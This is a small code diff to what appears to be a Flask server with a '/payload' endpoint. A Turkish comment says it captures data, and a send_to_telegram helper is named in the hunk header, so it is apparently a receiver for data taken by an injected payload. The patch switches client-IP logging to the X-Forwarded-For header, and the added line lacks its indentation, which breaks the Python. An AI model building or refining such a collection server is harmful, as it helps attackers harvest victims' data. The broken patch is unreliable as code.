@@ -42,7 +42,7 @@ def send_to_telegram(message):
 @app.route('/payload', methods=['GET'])
 def payload_receiver():
     now = datetime.datetime.now().strftime("%H:%M:%S")
-    ip = request.remote_addr
+ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
 
     # Verileri yakala
     url = safe_decode(request.args.get('u', ''))
